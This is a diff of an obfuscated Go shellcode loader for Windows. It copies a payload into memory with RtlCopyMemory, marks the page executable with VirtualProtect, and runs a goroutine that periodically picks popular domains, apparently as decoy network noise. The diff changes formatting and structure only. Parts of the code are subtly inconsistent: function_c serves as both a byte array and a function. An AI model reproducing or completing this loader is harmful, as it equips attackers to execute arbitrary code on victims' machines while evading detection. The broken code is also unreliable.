@@ -6,6 +6,7 @@ import (
 	"log"
 	"math/rand"
 	"syscall"
+	"time"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
@@ -66,7 +67,7 @@ func main() {
 	if *variable_b {
 		fmt.Println("[DEBUG]Copying shellcode to memory with RtlCopyMemory...")
 	}
-	_, _, variable_p := variable_i.Call(variable_k, uintptr(unsafe.Pointer(&function_c[0])), uintptr(len(function_c)))
+	_, _, variable_p := variable_i.Call(variable_k, (uintptr)(unsafe.Pointer(&function_c[0])), uintptr(len(function_c)))
 
 	if variable_p != nil && variable_p.Error() != "The operation completed successfully." {
 		log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", variable_p.Error()))
@@ -81,7 +82,7 @@ func main() {
 	}
 	variable_q := PAGE_READWRITE
 	_, _, variable_t := variable_g.Call(variable_k, uintptr(len(function_c)), PAGE_EXECUTE, uintptr(unsafe.Pointer(&variable_q)))
-	if variable_t != nil && variable_t.Error() != "The operation completed successfully." {
+	if variable_t!= nil && variable_t.Error() != "The operation completed successfully." {
 		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", variable_t.Error()))
 	}
 
@@ -133,22 +134,26 @@ func function_b() {
 func function_c() {
 	rand.Seed(time.Now().UnixNano())
 	for i := 0; i < rand.Intn(4)+1; i++ {
-		// 异步处理网络请求
-		go func() {
-			ticker := time.NewTicker(5 * time.Minute)
-			defer ticker.Stop()
-			for range ticker.C {
-				variable_a := []string{"google.com", "facebook.com", "youtube.com"} // Alexa Top 100 中的域名
-				rand.Seed(time.Now().UnixNano())
-				variable_b := rand.Intn(len(variable_a))
-				variable_c := variable_a[variable_b]
-				url := "https://" + variable_c
-				// 发送HTTPS GET请求
-				// 这里省略了实际的HTTP请求代码
-				fmt.Println(url)
+	}
+	// 异步处理网络请求
+	go func() {
+		defer func() {
+			if r := recover(); r != nil {
+				fmt.Println("Recovered from panic:", r)
 			}
 		}()
-	}
+		ticker := time.NewTicker(5 * time.Minute)
+		defer ticker.Stop()
+		for range ticker.C {
+			variable_a := []string{"google.com", "facebook.com", "youtube.com"} // Alexa Top 100 中的域名
+			rand.Seed(time.Now().UnixNano())
+			variable_b := rand.Intn(len(variable_a))
+			variable_c := variable_a[variable_b]
+			url := "https://" + variable_c
+			// 发送HTTPS GET请求
+			// 这里省略了实际的HTTP请求代码
+		}
+	}()
 }
 
 func function_d() {
